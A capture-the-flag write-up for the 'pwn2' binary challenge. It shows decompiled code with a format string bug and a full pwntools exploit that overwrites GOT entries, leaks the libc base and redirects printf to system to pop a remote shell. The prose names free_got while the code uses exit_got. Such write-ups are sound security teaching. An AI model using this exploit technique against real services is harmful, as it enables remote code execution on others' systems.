# pwn2
> LongChampion, 06/04/2020

## Challenge
The binary is compiled with no PIE and partial RELRO, look at `main` function:
```cpp
void __cdecl __noreturn main(int a1)
{
  char s[4]; // [esp+0h] [ebp-4Ch]
  char v2; // [esp+4h] [ebp-48h]
  unsigned int v3; // [esp+40h] [ebp-Ch]
  int *v4; // [esp+44h] [ebp-8h]

  v4 = &a1;
  v3 = __readgsdword(0x14u);
  *(_DWORD *)s = 0;
  memset(&v2, 0, 0x3Cu);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  alarm(0x3Cu);
  sub_80485B6();
  printf("input: ");
  fgets(s, 64, stdin);
  printf(s);
  exit(0);
}
```
Well, you can see that these is a format string vulnerable.  
First, I overwrite `free_got` with main_addr to create a loop, so we can use this vulnerable multiple times. After that, I use format string to scan the return address of main to leak libc base address. Finally, I overwrite `printf_got` with `system` then type `/bin/sh` to pop a shell.

## Solution
```python
#!/usr/bin/env python2
from pwn import *
context.binary = "./pwn2"

BASE = 7
exit_got = 0x804b020
main_addr = 0x080485EB

r = remote('pwn2-01.play.midnightsunctf.se', 10002)
lib = ELF("./libc.so.6", checksec=False)


payload1 = fmtstr_payload(BASE, {exit_got: main_addr})
r.sendlineafter("input:", payload1)

payload2 = "%59$x"
r.sendlineafter("input:", payload2)
Leak = r.recvline().strip()
print "Leak =", Leak
LIBC = int(Leak, 16) - lib.symbols["__libc_start_main"]
log.info("LIBC ~= " + hex(LIBC))
LIBC &= ~0xfff
log.success("LIBC: " + hex(LIBC))

system = LIBC + lib.symbols["system"]

printf_got = 0x804b00c
payload3 = fmtstr_payload(BASE, {printf_got: system}, write_size="short")
r.sendlineafter("input:", payload3)
r.interactive() # type /bin/sh to pop a shell
```
